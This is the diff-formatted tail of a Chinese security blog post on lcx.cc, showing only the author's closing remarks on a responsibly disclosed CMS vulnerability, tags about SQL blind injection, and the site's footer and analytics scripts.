+<P align=left>&nbsp;&nbsp;&nbsp; 该漏洞比较菜，只是作为分享给那些和我一样菜的朋友一个学习参考和一个交流的机会。请各位海涵。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 该BUG，已经通知程序作者，本文在征得程序作者同意后公布，请大家就不要批量搞了。</P>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2011-01-04
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/cms/">CMS</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E7%9B%B2%E6%B3%A8/">盲注</a>
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/mysql/">Mysql</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E7%AE%A1%E7%90%86/">管理</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E5%90%8E%E5%8F%B0/">后台</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/1064/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">【视频】我让你不给我加星！好素材！哈！</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/1062/">
+            <span class="next-text nav-default">野草内容管理系统 WeedCMS 5.0 写马漏洞</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
